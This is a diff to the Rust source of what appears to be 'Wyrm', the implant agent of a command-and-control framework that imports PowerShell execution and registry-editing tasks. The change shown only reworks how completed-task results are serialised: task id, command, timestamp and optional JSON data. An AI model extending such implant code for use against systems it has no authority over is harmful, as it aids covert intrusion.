@@ -9,7 +9,7 @@ use std::{
 use rand::{Rng, rng};
 use serde::Serialize;
 use shared::{
-    net::{CommandHeader, CompletedTasks},
+    net::CompletedTasks,
     pretty_print::print_failed,
     tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
 };
@@ -40,6 +40,7 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
+    utils::time_utils::epoch_now,
 };
 
 pub struct RetriesBeforeExit {
@@ -352,40 +353,49 @@ impl Wyrm {
     where
         T: Serialize,
     {
-        let command = task.command;
-        let id = task.id;
-
-        //
-        // Start off by encoding the Command into the packet header
-        //
-
-        let mut packet: Vec<u16> = Vec::from_command(command);
-
-        let data = match serde_json::to_string(&data) {
-            Ok(inner) => inner,
-            Err(e) => {
-                #[cfg(debug_assertions)]
-                println!(
-                    "[-] Error serialising data to be pushed to the completed task queue. {e}"
-                );
-
-                return;
-            }
-        };
-
-        // Write the data into the packet
-        let mut data_bytes: Vec<u16> = data.encode_utf16().collect();
-        packet.append(&mut data_bytes);
-
-        //
-        // Finally serialise the task ID
-        //
-        let id_bytes = id.to_le_bytes();
+        let id_bytes = task.id.to_le_bytes();
         let low = u16::from_le_bytes([id_bytes[0], id_bytes[1]]);
         let high = u16::from_le_bytes([id_bytes[2], id_bytes[3]]);
 
+        let mut packet = vec![low, high];
+
+        let (low, high) = task.command.to_u16_tuple_le();
         packet.push(low);
         packet.push(high);
+
+        //
+        // Finally serialise the completed time; theres probably a better way to write this..
+        //
+        let completed_time_bytes = epoch_now().to_le_bytes();
+        let sec_1 = u16::from_le_bytes([completed_time_bytes[0], completed_time_bytes[1]]);
+        let sec_2 = u16::from_le_bytes([completed_time_bytes[2], completed_time_bytes[3]]);
+        let sec_3 = u16::from_le_bytes([completed_time_bytes[4], completed_time_bytes[5]]);
+        let sec_4 = u16::from_le_bytes([completed_time_bytes[6], completed_time_bytes[7]]);
+
+        packet.push(sec_1);
+        packet.push(sec_2);
+        packet.push(sec_3);
+        packet.push(sec_4);
+
+        //
+        // Write the data into the packet if it exists
+        //
+        if let Some(d) = &data {
+            let data = match serde_json::to_string(&d) {
+                Ok(inner) => inner,
+                Err(e) => {
+                    #[cfg(debug_assertions)]
+                    println!(
+                        "[-] Error serialising data to be pushed to the completed task queue. {e}"
+                    );
+
+                    return;
+                }
+            };
+
+            let mut data_bytes: Vec<u16> = data.encode_utf16().collect();
+            packet.append(&mut data_bytes);
+        }
 
         self.completed_tasks.push(packet);
     }
